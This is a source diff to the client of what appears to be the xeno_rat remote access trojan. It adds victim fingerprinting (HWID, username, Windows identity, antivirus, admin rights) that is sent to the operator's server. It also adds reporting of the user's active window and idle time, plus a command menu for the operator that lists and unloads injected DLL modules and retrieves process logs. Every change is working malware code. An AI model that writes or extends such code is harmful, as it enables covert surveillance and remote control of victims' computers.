@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Linq;
+using System.Security.Principal;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
@@ -57,8 +58,8 @@ namespace xeno_rat_client
                 return;
             }
             //get hwid, username etc. seperated by null
-            string clientversion = "1.7.0";//find a way to get the client version.
-            string[] info = new string[] { Utils.HWID(), Environment.UserName , clientversion, Utils.GetWindowsVersion(), Utils.GetAntivirus(), Utils.IsAdmin().ToString() };
+            string clientversion = "1.8.0";//find a way to get the client version.
+            string[] info = new string[] { Utils.HWID(), Environment.UserName, WindowsIdentity.GetCurrent().Name, clientversion, Utils.GetWindowsVersion(), Utils.GetAntivirus(), Utils.IsAdmin().ToString() };
             byte[] data = new byte[0];
             byte[] nullbyte = new byte[] { 0 };
             for(int i=0;i<info.Length;i++) 
@@ -149,7 +150,7 @@ namespace xeno_rat_client
                 switch (opcode)
                 {
                     case 0:
-                        await SendCurrentWindow(subServer);
+                        await SendUpdateInfo(subServer);
                         break;
                     case 1:
                         await dllhandler.DllNodeHandler(subServer);
@@ -159,6 +160,9 @@ namespace xeno_rat_client
                         break;
                     case 3:
                         return;
+                    case 4:
+                        await DebugMenu(subServer, data);
+                        break;
 
                 }
             }
@@ -166,12 +170,36 @@ namespace xeno_rat_client
             subServer.Disconnect();
         }
 
+        public async Task DebugMenu(Node subServer, byte[] data) 
+        {
+            int opcode = data[1];
+            switch (opcode) 
+            {
+                case 0:
+                    await subServer.SendAsync(Encoding.UTF8.GetBytes(String.Join("\n", dllhandler.Assemblies.Keys)));
+                    break;//get dlls
+                case 1:
+                    string assm=Encoding.UTF8.GetString(data.Skip(2).ToArray());
+                    bool worked = false;
+                    if (dllhandler.Assemblies.Keys.Contains(assm)) 
+                    {
+                        worked=dllhandler.Assemblies.Remove(assm);
+                    }
 
-        public async Task SendCurrentWindow(Node node) 
+                    await subServer.SendAsync(new byte[] { (byte)(worked ? 1 : 0) });
+                    break;//unload dll
+                case 2:
+                    await subServer.SendAsync(Encoding.UTF8.GetBytes(Program.ProcessLog.ToString()));
+                    break;//get console log
+            }
+        }
+
+        public async Task SendUpdateInfo(Node node) 
         {
             string currwin = Utils.GetCaptionOfActiveWindow();
-            byte[] data=Encoding.UTF8.GetBytes(currwin);
-            //Console.WriteLine(currwin);
+            string idleTime = (Utils.GetIdleTime()/1000).ToString();
+            string update_data = currwin + "\n" + idleTime;
+            byte[] data=Encoding.UTF8.GetBytes(update_data);
             await node.SendAsync(data);
         }
 
